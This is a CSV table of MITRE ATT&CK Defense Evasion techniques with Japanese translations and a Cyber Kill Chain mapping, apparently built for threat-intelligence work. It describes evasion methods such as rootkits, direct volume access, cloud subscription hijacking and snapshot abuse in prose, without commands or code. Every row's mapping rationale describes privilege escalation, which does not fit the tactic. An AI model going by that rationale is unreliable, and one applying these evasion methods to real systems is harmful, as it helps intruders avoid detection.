tactic_id,tactic_name_jp,tactic_name_eng,tactic_description_jp,tactic_description_eng,technique_id,technique_name_jp,technique_name_eng,technique_description_jp,technique_description_eng,subtechnique_id,subtechnique_name_jp,subtechnique_name_eng,subtechnique_description_jp,subtechnique_description_eng,cyber_kill_chain_phase_number_1,cyber_kill_chain_phase_name_eng_1,cyber_kill_chain_phase_description_eng_1,cyber_kill_chain_phase_name_jp_1,cyber_kill_chain_phase_description_jp_1,cyber_kill_chain_phase_number_2,cyber_kill_chain_phase_name_eng_2,cyber_kill_chain_phase_description_eng_2,cyber_kill_chain_phase_name_jp_2,cyber_kill_chain_phase_description_jp_2,tactic_ckc_mapping_rational
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1006,ダイレクトボリュームアクセス,Direct Volume Access,"攻撃者は、ファイルアクセス制御とファイルシステム監視をバイパスするために、ボリュームに直接アクセスする可能性があります。Windowsでは、プログラムは論理ボリュームに直接アクセスできます。直接アクセス権を持つプログラムは、ファイルシステムデータ構造を分析することにより、ドライブから直接ファイルを読み書きできます。このテクニックは、Windowsファイルアクセス制御とファイルシステム監視ツールをバイパスする可能性があります。(引用: Hakobyan 2009)

`NinjaCopy`などのユーティリティは、PowerShellでこれらのアクションを実行するために存在します。(引用: Github PowerSploit Ninjacopy) 攻撃者はまた、組み込みユーティリティまたはサードパーティユーティリティ（`vssadmin`、`wbadmin`、[esentutl](https://attack.mitre.org/software/S0404)など）を使用して、システムボリュームからデータのシャドウコピーまたはバックアップを作成する可能性があります。(引用: LOLBAS Esentutl)","Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)

Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1666,クラウドリソース階層の変更,Modify Cloud Resource Hierarchy,"攻撃者は、防御を回避するために、Infrastructure-as-a-Service（IaaS）環境の階層構造を変更しようとする可能性があります。

IaaS環境では、リソースを階層にグループ化することが多く、これによりリソース管理が改善され、関連するグループにポリシーを適用できます。階層構造はクラウドプロバイダーによって異なります。例えば、AWS環境では、複数のアカウントを単一の組織の下にグループ化できますが、Azure環境では、複数のサブスクリプションを単一の管理グループの下にグループ化できます。(引用: AWS Organizations)(引用: Microsoft Azure Resources)

攻撃者は、IaaS階層内のリソースグループを追加、削除、またはその他の方法で変更する可能性があります。例えば、Azure環境では、グローバル管理者アカウントへのアクセスを取得した攻撃者は、リソースを展開するための新しいサブスクリプションを作成する可能性があります。また、既存の従量課金制サブスクリプションを被害者テナントから攻撃者が制御するテナントに転送することにより、サブスクリプションハイジャックを行う可能性もあります。これにより、攻撃者は被害者テナントにログを生成することなく、被害者のコンピューティングリソースを使用できます。(引用: Microsoft Peach Sandstorm 2023)(引用: Microsoft Subscription Hijacking 2022)

AWS環境では、特定のアカウントで適切な権限を持つ攻撃者は、`LeaveOrganization` APIを呼び出して、アカウントを関連付けられていたAWS組織から切り離し、以前の組織によって課せられていたサービスコントロールポリシー、ガードレール、または制限を削除する可能性があります。あるいは、攻撃者は`CreateAccount` APIを呼び出して、AWS組織内に新しいアカウントを作成する可能性があります。このアカウントは支払いアカウントに登録されているのと同じ支払い方法を使用しますが、既存の検出またはサービスコントロールポリシーの対象とならない場合があります。(引用: AWS RE:Inforce Threat Detection 2024)","Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.

IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.(Citation: AWS Organizations)(Citation: Microsoft Azure Resources)

Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm 2023)(Citation: Microsoft Subscription Hijacking 2022)

In AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1014,ルートキット,Rootkit,"攻撃者はルートキットを使用して、プログラム、ファイル、ネットワーク接続、サービス、ドライバー、およびその他のシステムコンポーネントの存在を隠す可能性があります。ルートキットは、システム情報を提供するオペレーティングシステムAPI呼び出しを傍受/フックし変更することにより、マルウェアの存在を隠すプログラムです。(引用: Symantec Windows Rootkits)

ルートキットまたはルートキット有効化機能は、オペレーティングシステムのユーザーレベルまたはカーネルレベル、あるいはハイパーバイザー、マスターブートレコード、または[システムファームウェア](https://attack.mitre.org/techniques/T1542/001)を含むより低いレベルに存在する可能性があります。(引用: Wikipedia Rootkit) ルートキットは、Windows、Linux、およびMac OS Xシステムで見られています。(引用: CrowdStrike Linux Rootkit)(引用: BlackHat Mac OSX Rootkit)","Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits)

Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1578,クラウドコンピューティングインフラストラクチャの変更,Modify Cloud Compute Infrastructure,"攻撃者は、防御を回避するために、クラウドアカウントのコンピューティングサービスインフラストラクチャを変更しようとする可能性があります。コンピューティングサービスインフラストラクチャの変更には、コンピューティングインスタンス、仮想マシン、スナップショットなどの1つ以上のコンポーネントの作成、削除、または変更が含まれる場合があります。

インフラストラクチャコンポーネントの変更によって得られた権限により、既存のインフラストラクチャへのアクセスを妨げる制限をバイパスできる場合があります。インフラストラクチャコンポーネントを変更すると、攻撃者は検出を回避し、その存在の証拠を削除できる可能性もあります。(引用: Mandiant M-Trends 2020)","An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.

Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",T1578.001,スナップショットの作成,Create Snapshot,"攻撃者は、防御を回避するために、クラウドアカウント内にスナップショットまたはデータバックアップを作成する可能性があります。スナップショットは、仮想マシン（VM）、仮想ハードドライブ、またはボリュームなどの既存のクラウドコンピューティングコンポーネントの特定時点のコピーです。攻撃者は、既存のコンピューティングサービスインフラストラクチャへのアクセスを妨げる制限をバイパスするために、スナップショットを作成する権限を利用する可能性があります。これは、攻撃者が検出を回避し、その存在の証拠を削除するためにスナップショットに戻る可能性がある[クラウドインスタンスの復元](https://attack.mitre.org/techniques/T1578/004)とは異なります。

攻撃者は[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、作成された1つ以上のスナップショットをそのインスタンスにマウントし、その後、インバウンドおよびアウトバウンドSSHアクセスを許可するファイアウォールポリシーなど、作成されたインスタンスへの攻撃者のアクセスを許可するポリシーを適用する可能性があります。(引用: Mandiant M-Trends 2020)","An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.

An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1578,クラウドコンピューティングインフラストラクチャの変更,Modify Cloud Compute Infrastructure,"攻撃者は、防御を回避するために、クラウドアカウントのコンピューティングサービスインフラストラクチャを変更しようとする可能性があります。コンピューティングサービスインフラストラクチャの変更には、コンピューティングインスタンス、仮想マシン、スナップショットなどの1つ以上のコンポーネントの作成、削除、または変更が含まれる場合があります。

インフラストラクチャコンポーネントの変更によって得られた権限により、既存のインフラストラクチャへのアクセスを妨げる制限をバイパスできる場合があります。インフラストラクチャコンポーネントを変更すると、攻撃者は検出を回避し、その存在の証拠を削除できる可能性もあります。(引用: Mandiant M-Trends 2020)","An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.

Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",T1578.003,クラウドインスタンスの削除,Delete Cloud Instance,"攻撃者は、検出を回避し、その存在の証拠を削除するために、悪意のあるアクティビティを実行した後にクラウドインスタンスを削除する可能性があります。インスタンスまたは仮想マシンを削除すると、インスタンスが回復不可能な場合、貴重なフォレンジックアーティファクトやその他の疑わしい動作の証拠が削除される可能性があります。

攻撃者はまた、[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、目的を達成した後にインスタンスを終了する可能性もあります。(引用: Mandiant M-Trends 2020)","An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.

An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1578,クラウドコンピューティングインフラストラクチャの変更,Modify Cloud Compute Infrastructure,"攻撃者は、防御を回避するために、クラウドアカウントのコンピューティングサービスインフラストラクチャを変更しようとする可能性があります。コンピューティングサービスインフラストラクチャの変更には、コンピューティングインスタンス、仮想マシン、スナップショットなどの1つ以上のコンポーネントの作成、削除、または変更が含まれる場合があります。

インフラストラクチャコンポーネントの変更によって得られた権限により、既存のインフラストラクチャへのアクセスを妨げる制限をバイパスできる場合があります。インフラストラクチャコンポーネントを変更すると、攻撃者は検出を回避し、その存在の証拠を削除できる可能性もあります。(引用: Mandiant M-Trends 2020)","An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.

Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",T1578.004,クラウドインスタンスの復元,Revert Cloud Instance,"攻撃者は、検出を回避し、その存在の証拠を削除するために、悪意のあるアクティビティを実行した後にクラウドインスタンスに加えられた変更を元に戻す可能性があります。クラウドベースのインフラストラクチャなどの高度に仮想化された環境では、これはクラウド管理ダッシュボードまたはクラウドAPIを介して仮想マシン（VM）またはデータストレージスナップショットを復元することによって達成される場合があります。

このテクニックの別のバリエーションは、コンピューティングインスタンスにアタッチされた一時ストレージを利用することです。ほとんどのクラウドプロバイダーは、永続的、ローカル、および/または一時的なストレージを含むさまざまな種類のストレージを提供しており、一時的なタイプはVMの停止/再起動時にリセットされることがよくあります。(引用: Tech Republic - Restore AWS Snapshots)(引用: Google - Restore Cloud Snapshot)","An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.

Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1578,クラウドコンピューティングインフラストラクチャの変更,Modify Cloud Compute Infrastructure,"攻撃者は、防御を回避するために、クラウドアカウントのコンピューティングサービスインフラストラクチャを変更しようとする可能性があります。コンピューティングサービスインフラストラクチャの変更には、コンピューティングインスタンス、仮想マシン、スナップショットなどの1つ以上のコンポーネントの作成、削除、または変更が含まれる場合があります。

インフラストラクチャコンポーネントの変更によって得られた権限により、既存のインフラストラクチャへのアクセスを妨げる制限をバイパスできる場合があります。インフラストラクチャコンポーネントを変更すると、攻撃者は検出を回避し、その存在の証拠を削除できる可能性もあります。(引用: Mandiant M-Trends 2020)","An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.

Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",T1578.002,クラウドインスタンスの作成,Create Cloud Instance,"攻撃者は、防御を回避するために、クラウドアカウントのコンピューティングサービス内に新しいインスタンスまたは仮想マシン（VM）を作成する可能性があります。新しいインスタンスを作成すると、攻撃者は現在アカウント内に存在するインスタンスに存在するファイアウォールルールとアクセス許可をバイパスできる可能性があります。攻撃者はアカウント内の1つ以上のボリュームの[スナップショットの作成](https://attack.mitre.org/techniques/T1578/001)を行い、新しいインスタンスを作成し、スナップショットをマウントし、その後、[ローカルシステムからのデータ](https://attack.mitre.org/techniques/T1005)を収集したり、[リモートデータステージング](https://attack.mitre.org/techniques/T1074/002)のために制限の緩いセキュリティポリシーを適用したりする可能性があります。(引用: Mandiant M-Trends 2020)

新しいインスタンスを作成すると、攻撃者は現在実行中のインスタンスの実行に影響を与えることなく、環境内で悪意のあるアクティビティを実行できる可能性もあります。","An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)

Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1578,クラウドコンピューティングインフラストラクチャの変更,Modify Cloud Compute Infrastructure,"攻撃者は、防御を回避するために、クラウドアカウントのコンピューティングサービスインフラストラクチャを変更しようとする可能性があります。コンピューティングサービスインフラストラクチャの変更には、コンピューティングインスタンス、仮想マシン、スナップショットなどの1つ以上のコンポーネントの作成、削除、または変更が含まれる場合があります。

インフラストラクチャコンポーネントの変更によって得られた権限により、既存のインフラストラクチャへのアクセスを妨げる制限をバイパスできる場合があります。インフラストラクチャコンポーネントを変更すると、攻撃者は検出を回避し、その存在の証拠を削除できる可能性もあります。(引用: Mandiant M-Trends 2020)","An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.

Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",T1578.005,クラウドコンピューティング構成の変更,Modify Cloud Compute Configurations,"攻撃者は、防御を回避するために、クラウドコンピューティングインフラストラクチャで利用可能なサイズ、場所、リソースに直接影響を与える設定を変更する可能性があります。これらの設定には、サービス割り当て、サブスクリプションの関連付け、テナント全体のポリシー、または利用可能なコンピューティングに影響を与えるその他の構成が含まれる場合があります。このような変更により、攻撃者は被害者のコンピューティングリソースを悪用して目標を達成できるようになる可能性があり、実行中のインスタンスの実行に影響を与えたり、被害者にその活動を明らかにしたりすることなく行われる可能性があります。

例えば、クラウドプロバイダーはしばしば割り当てを介して顧客のコンピューティングリソースの使用を制限します。顧客は、コンピューティングニーズの増加をサポートするためにこれらの割り当ての調整を要求できますが、これらの調整にはクラウドプロバイダーからの承認が必要になる場合があります。クラウド環境を侵害した攻撃者は、被害者の割り当て全体を使い果たすことによって疑いを招くことなく、追加の[リソースハイジャック](https://attack.mitre.org/techniques/T1496)を有効にするなど、その活動をサポートするために同様に割り当て調整を要求する可能性があります。(引用: Microsoft Cryptojacking 2023) 攻撃者はまた、展開された仮想マシンのサイズを制限するテナント全体のポリシーを変更することにより、許可されるリソース使用量を増やす可能性があります。(引用: Microsoft Azure Policy)

攻撃者はまた、[未使用/未サポートのクラウドリージョン](https://attack.mitre.org/techniques/T1535)を有効にするなど、クラウドリソースを展開できる場所に影響を与える設定を変更する可能性もあります。","Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.

For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victim’s entire quota.(Citation: Microsoft Cryptojacking 2023) Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.(Citation: Microsoft Azure Policy)

Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

